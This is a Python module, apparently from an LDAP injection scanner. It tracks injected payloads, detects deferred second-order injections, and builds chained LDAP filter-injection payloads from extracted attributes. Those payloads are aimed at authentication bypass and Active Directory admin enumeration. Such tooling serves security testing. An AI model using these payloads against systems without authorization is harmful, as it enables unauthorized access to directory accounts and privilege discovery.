import threading
import uuid
import time
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Any
from .models import Endpoint, Baseline, Payload, PayloadTier, ScanConfig
from .client import HTTPClient
from .detection import DetectionPipeline
from .utils import now_iso, build_injection_data, finding
from .patterns import LDAP_FILTER_REFLECT_RE, LDAP_ERRORS_RE

class ExploitStateTracker:
    @dataclass
    class InjectedState:
        endpoint_url: str; parameter: str; payload_raw: str; technique: str; timestamp: str; session_cookies: Dict[str, str] = field(default_factory=dict); csrf_tokens: Dict[str, str] = field(default_factory=dict); marker: str = ""; triggered: bool = False; trigger_resp_class: str = ""
    def __init__(self, cfg: ScanConfig):
        self._cfg = cfg; self._states = []; self._lock = threading.Lock(); self._extracted = {}; self._injectable_eps = {}
    def record_injection(self, ep: Endpoint, param: str, payload: str, tech: str, cookies: Dict = None, csrf: Dict = None) -> str:
        marker = f"HH_{self._cfg.scan_id[:6]}_{uuid.uuid4().hex[:6]}"; state = self.InjectedState(endpoint_url=ep.url, parameter=param, payload_raw=payload, technique=tech, timestamp=now_iso(), session_cookies=cookies or {}, csrf_tokens=csrf or {}, marker=marker)
        with self._lock: self._states.append(state); self._injectable_eps.setdefault(ep.url, []); (self._injectable_eps[ep.url].append(param) if param not in self._injectable_eps[ep.url] else None)
        return marker
    def record_extracted_value(self, attr: str, val: str):
        with self._lock: self._extracted[attr] = val
    def get_extracted(self) -> Dict[str, str]:
        with self._lock: return dict(self._extracted)
    def probe_deferred_triggers(self, client: HTTPClient, pipeline: DetectionPipeline, baselines: Dict[str, Baseline], delay: float = 1.0) -> List[Dict]:
        triggered = []; (time.sleep(delay) if self._states else None)
        with self._lock: pending = [s for s in self._states if not s.triggered]
        for s in pending:
            bl = next((b for k, b in baselines.items() if s.endpoint_url in k), None)
            if not bl: continue
            pep = Endpoint(url=s.endpoint_url, method="GET", params=[s.parameter], source="state_probe")
            resp = client.send_endpoint(pep, build_injection_data(pep, s.parameter, "*", self._cfg.deterministic_suffix), phase="injection")
            if resp and s.marker in (resp.text or ""):
                det = pipeline.run(resp, bl, Payload(s.payload_raw, "deferred", s.technique, PayloadTier.TIER6_SECOND_ORDER))
                if det.fired or LDAP_FILTER_REFLECT_RE.search(resp.text) or LDAP_ERRORS_RE.search(resp.text):
                    with self._lock: s.triggered = True; s.trigger_resp_class = det.response_class
                    triggered.append({"endpoint_url": s.endpoint_url, "parameter": s.parameter, "marker": s.marker, "technique": s.technique, "det_score": det.score, "timestamp": now_iso()}); finding(f"  [STATE] Deferred injection triggered: {s.endpoint_url}:{s.parameter} marker={s.marker}")
        return triggered
    def build_chained_payloads(self, extracted: Dict[str, str], stype: str = "generic") -> List[Payload]:
        pls = []; uid = extracted.get("uid") or extracted.get("sAMAccountName", ""); mail = extracted.get("mail", ""); cn = extracted.get("cn", "")
        if uid: pls += [Payload(f"*(uid={uid})(|(uid=*)", f"Chained: uid={uid} OR bypass", "chain_uid_or", PayloadTier.TIER1_CORE, 10), Payload(f"*(|(uid={uid})(uid=admin))", f"Chained: uid={uid} admin equivalence", "chain_uid_admin", PayloadTier.TIER1_CORE, 9)]
        (pls.append(Payload(f"*(mail={mail})(|(mail=*)", f"Chained: mail={mail} OR bypass", "chain_mail_or", PayloadTier.TIER1_CORE, 8)) if mail else None); (pls.append(Payload(f"*(cn={cn})(objectClass=*)", f"Chained: cn={cn} objectClass probe", "chain_cn_probe", PayloadTier.TIER1_CORE, 8)) if cn else None)
        (pls.append(Payload(f"*(sAMAccountName={uid})(adminCount=1)", f"Chained AD: {uid} admin flag check", "chain_ad_admin", PayloadTier.TIER1_CORE, 9, "any", "ad")) if stype == "ad" and uid else None)
        return pls
